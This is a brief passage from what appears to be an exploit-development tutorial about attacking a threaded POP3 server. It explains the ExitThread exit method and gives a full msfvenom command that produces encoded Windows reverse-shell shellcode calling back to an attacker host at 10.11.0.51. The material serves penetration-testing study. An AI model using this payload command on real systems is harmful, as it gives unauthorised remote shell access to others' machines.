If the program we are exploiting is a threaded application, we can try to avoid crashing the service completely, by using an ExitThread method instead, which will just terminate the affected thread of the program. This will make our exploit work without interrupting the usual operations of the POP3 servers, as well as allow us to repeatedly exploit the server, and exit the shell without bringing down the service. To instruct msfvenom to use the ExitThread method during the shellcode generation, we can issue the follwoing command:

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.51 LPORT=1337 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
